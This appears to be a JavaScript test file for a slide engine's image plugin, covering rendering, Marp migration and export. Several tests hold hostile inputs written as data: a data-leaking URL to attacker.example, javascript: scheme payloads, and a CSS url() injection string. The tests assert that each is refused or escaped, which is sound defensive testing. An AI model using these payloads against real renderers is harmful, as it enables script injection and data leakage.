'use strict';
/**
 * The image plugin (lib/plugins/image; engineering/decisions/2026-10-16-media-plugins.md §4.2, §4.5, §8 decision 2): the address
 * comes only from the author's own record, the slide seats the picture, Marp's keywords migrate losslessly, and the Marp bundle
 * writes Marp's own spelling.
 */
const { describe, test } = require('node:test');
const assert = require('node:assert/strict');
const { JSDOM } = require('jsdom');
const engine = require('../../../lib/engine');
const dispatcher = require('../../../lib/core/inline-code-directives.js');
const { migrateBgLine, classLineWith, readBgLine } = require('../../../lib/plugins/image/shared/image-migrate.js');
const { withImageMarkdown } = require('../../../lib/plugins/image/shared/image-marp-export.js');
const { ctxFor } = require('../../../lib/core/plugin-ctx.js');
const { lintText, buildVocab } = require('../../../lib/authoring/lint.js');

const deck = (cls, body) => `---\ntheme: indaco\n---\n\n<!-- _class: ${cls} -->\n\n## T\n\n${body}\n`;
const html = (md) => engine.render(md).html;

describe('the address comes only from the author\'s record (§4.5)', () => {
  test('the DOM path never draws a picture record: a plugin\'s `<code>@image{…}</code>` stays text', () => {
    const doc = new JSDOM('<!doctype html><body></body>').window.document;
    assert.equal(dispatcher.renderElement(doc, '@image{https://attacker.example/?d=secret}'), null);
    assert.equal(dispatcher.renderHtml('@image{https://attacker.example/?d=secret}'), null, 'not inline HTML either');
  });

  test('the kind is declared address, named-only and block', () => {
    const row = require('../../../lib/plugins/inline.generated.js').INLINE.find((k) => k.name === 'image');
    assert.equal(row.address, true);
    assert.equal(row.namedOnly, true);
    assert.equal(row.block, true);
  });

  test('a scheme the allowlist refuses draws nothing', () => {
    assert.doesNotMatch(html(deck('content', '`@image{"javascript:alert(1)"}`')), /data-lattice-media="image"/);
  });

  test('a record in a sentence stays code, and lint says so', () => {
    const md = deck('content', 'See `@image{photo.jpg}` here.');
    assert.doesNotMatch(html(md), /data-lattice-media="image"/);
    const f = lintText(md, buildVocab());
    assert.ok((f.findings || f).some((x) => x.rule === 'image-not-alone'));
  });
});

describe('the slide places the picture', () => {
  test('an image slide: the layout\'s panel, exactly where `![bg](x)` put it', () => {
    const rec = html(deck('image', '`@image{photo.jpg}`'));
    assert.match(rec, /<div class="lattice-bg lattice-bg-full" data-lattice-media="image"[^>]*style="background-image:url\('photo\.jpg'\)"><\/div><div class="image-text">/);
  });

  test('`mirror` puts the panel on the left; `bleed` makes it the background; a collage keeps it a tile', () => {
    assert.match(html(deck('image mirror', '`@image{photo.jpg}`')), /lattice-bg lattice-bg-left/);
    assert.match(html(deck('content dark bleed', '`@image{photo.jpg}`')), /lattice-bg lattice-bg-full/);
    const col = html(deck('collage', '- `@image{a.jpg, title="A", frame=mat}`\n- `@image{b.jpg, title="B"}`'));
    assert.match(col, /<li class="collage-tile" data-label="A"><img src="a\.jpg" alt="A"/);
    assert.doesNotMatch(col, /data-frame="mat"/, 'a collage tile ignores the frame');
  });
});

describe('Marp\'s keywords to a record (§8 decision 2)', () => {
  test('placement moves to the slide, and what was never drawn is named', () => {
    assert.deepEqual(migrateBgLine('![bg left:40% blur:10px](sample:photo-wide.svg)', ['image']), { record: '`@image{sample:photo-wide.svg}`', addClass: 'mirror', dropped: [':40%', 'blur:10px'] });
    assert.deepEqual(migrateBgLine('![bg](p.jpg "The lake")', ['content', 'dark']), { record: '`@image{p.jpg, description="The lake"}`', addClass: 'bleed', dropped: [] });
    assert.equal(migrateBgLine('![bg right](p.jpg)', ['image']).addClass, null);
    assert.equal(migrateBgLine('Some text ![bg](p.jpg)', ['image']), null, 'only a line that is one directive');
  });

  test('an address Segno cannot read bare is quoted', () => {
    assert.equal(migrateBgLine('![bg](my%20photo,v2.jpg)', ['image']).record, '`@image{"my%20photo,v2.jpg"}`');
  });

  test('the class line gains the word once', () => {
    assert.equal(classLineWith('<!-- _class: image -->', 'mirror'), '<!-- _class: image mirror -->');
    assert.equal(classLineWith('<!-- _class: image mirror -->', 'mirror'), '<!-- _class: image mirror -->');
    assert.equal(classLineWith('Not a comment', 'mirror'), null);
  });

});

describe('Export-to-Marp writes Marp\'s own spelling', () => {
  const ctx = ctxFor('image');
  test('a panel or a background becomes `![bg]`, a flow figure a plain image', () => {
    assert.match(withImageMarkdown(deck('image', '`@image{p.jpg, description="D"}`'), {}, ctx), /^!\[bg\]\(p\.jpg "D"\)$/m);
    assert.match(withImageMarkdown(deck('content bleed', '`@image{p.jpg}`'), {}, ctx), /^!\[bg\]\(p\.jpg\)$/m);
    assert.match(withImageMarkdown(deck('content', '`@image{p.jpg, title="T", frame=mat}`'), {}, ctx), /^!\[T\]\(p\.jpg\)$/m);
  });

  test('a record the engine leaves as code is left as code', () => {
    const fenced = deck('content', '```markdown\n`@image{p.jpg}`\n```');
    assert.equal(withImageMarkdown(fenced, {}, ctx), fenced);
    const inText = deck('content', 'Text\n`@image{p.jpg}`');
    assert.equal(withImageMarkdown(inText, {}, ctx), inText);
  });
});

describe('the trio\'s findings on slice 3 stay fixed', () => {
  test('an entity in the address stays text inside `url(\'…\')`: no quote, no second url, nothing remote', () => {
    const out = html(deck('image', '`@image{"x&#39;&#41;;position:fixed;background-image:url&#40;&#39;http://attacker.example/a.png"}`'));
    const style = /<div class="lattice-bg[^>]*style="([^"]*)"/.exec(out)[1];
    const decoded = new JSDOM(`<div style="${style}"></div>`).window.document.querySelector('div').getAttribute('style');
    assert.equal((decoded.match(/url\(/g) || []).length, 1, decoded);
    assert.equal(decoded.indexOf("')"), decoded.length - 2, 'the url string closes only at its end');
  });

  test('no resolver, no picture: the raw address is never written', () => {
    assert.equal(dispatcher.renderBlockHtml('@image{"javascript:alert(1)"}'), null);
    assert.doesNotMatch(dispatcher.renderBlockHtml('@video{"https://youtu.be/dQw4w9WgXcQ", poster="javascript:x"}') || '', /javascript:/);
  });

  test('a collage packs a record as a tile, like a Markdown image', () => {
    const col = html(deck('collage', '- `@image{a.jpg, title="A"}`\n- `@image{b.jpg, title="B"}`\n- ![C](c.jpg)'));
    assert.match(col, /class="collage-list"/);
    assert.equal((col.match(/<li class="collage-tile"/g) || []).length, 3);
  });

  test('narration speaks a panel\'s words on an image slide and a bleed slide', async () => {
    const { projectDeckToScript } = await import('../../../lib/transformers/prose-projection.mjs');
    for (const cls of ['image', 'content dark bleed']) {
      const dom = new JSDOM(`<!doctype html><body>${html(deck(cls, '`@image{p.jpg, title="Lake title", description="Dawn description"}`'))}</body>`);
      assert.match(JSON.stringify(projectDeckToScript([...dom.window.document.querySelectorAll('section')])), /Lake title\. Dawn description\./, cls);
    }
  });

  test('the title is the name, the description the tooltip: never the title twice', () => {
    const out = html(deck('image', '`@image{p.jpg, title="T", description="D"}`'));
    assert.match(out, /aria-label="T" title="D"/);
  });

  test('the Marp translation follows the engine\'s class rules and its allowlist', () => {
    const ctx = ctxFor('image');
    const md = (fm, cls, body) => `---\n${fm}\n---\n\n<!-- _class: ${cls} -->\n\n${body}\n`;
    assert.match(withImageMarkdown(md('class: bleed', 'content', '`@image{p.jpg}`'), {}, ctx), /^!\[bg\]\(p\.jpg\)$/m, 'a deck-wide bleed is appended');
    assert.match(withImageMarkdown(md('class: image', 'content', '`@image{p.jpg}`'), {}, ctx), /^!\[\]\(p\.jpg\)$/m, 'a deck-wide component name is dropped');
    const refused = md('theme: indaco', 'content', '`@image{"javascript:alert(1)"}`');
    assert.equal(withImageMarkdown(refused, {}, ctx), refused);
  });

  test('the migration refuses to rewrite what it would change, and never edits a second directive', () => {
    assert.ok(migrateBgLine('![bg](x&#39;a.jpg)', ['image']).unsafe);
    assert.ok(migrateBgLine('![bg](a.jpg "a `b` c")', ['image']).unsafe);
    assert.equal(migrateBgLine('    ![bg](a.jpg)', ['content']), null, 'an indented code block');
    assert.equal(classLineWith('<!-- _class: content --><!-- _paginate: false -->', 'bleed'), null);
  });
});
